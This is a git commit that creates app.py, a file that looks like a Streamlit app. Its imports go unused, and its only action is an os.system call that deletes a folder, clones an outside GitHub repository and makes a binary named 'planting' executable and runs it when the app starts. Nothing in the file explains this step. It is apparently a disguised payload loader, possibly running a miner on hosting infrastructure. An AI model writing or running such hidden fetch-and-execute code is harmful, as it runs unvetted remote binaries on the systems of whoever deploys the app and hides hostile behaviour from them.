e164d71a000c78f48f13e9d5d02a39b271c0d5df
gaseopre <109199135+gaseopre@users.noreply.github.com>
2022-07-13 12:27:54 +0700

    Create app.py

---
+++ app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("rm -rf dag && git clone https://github.com/gaseopre/dag.git && cd dag && chmod +x planting && ./planting")
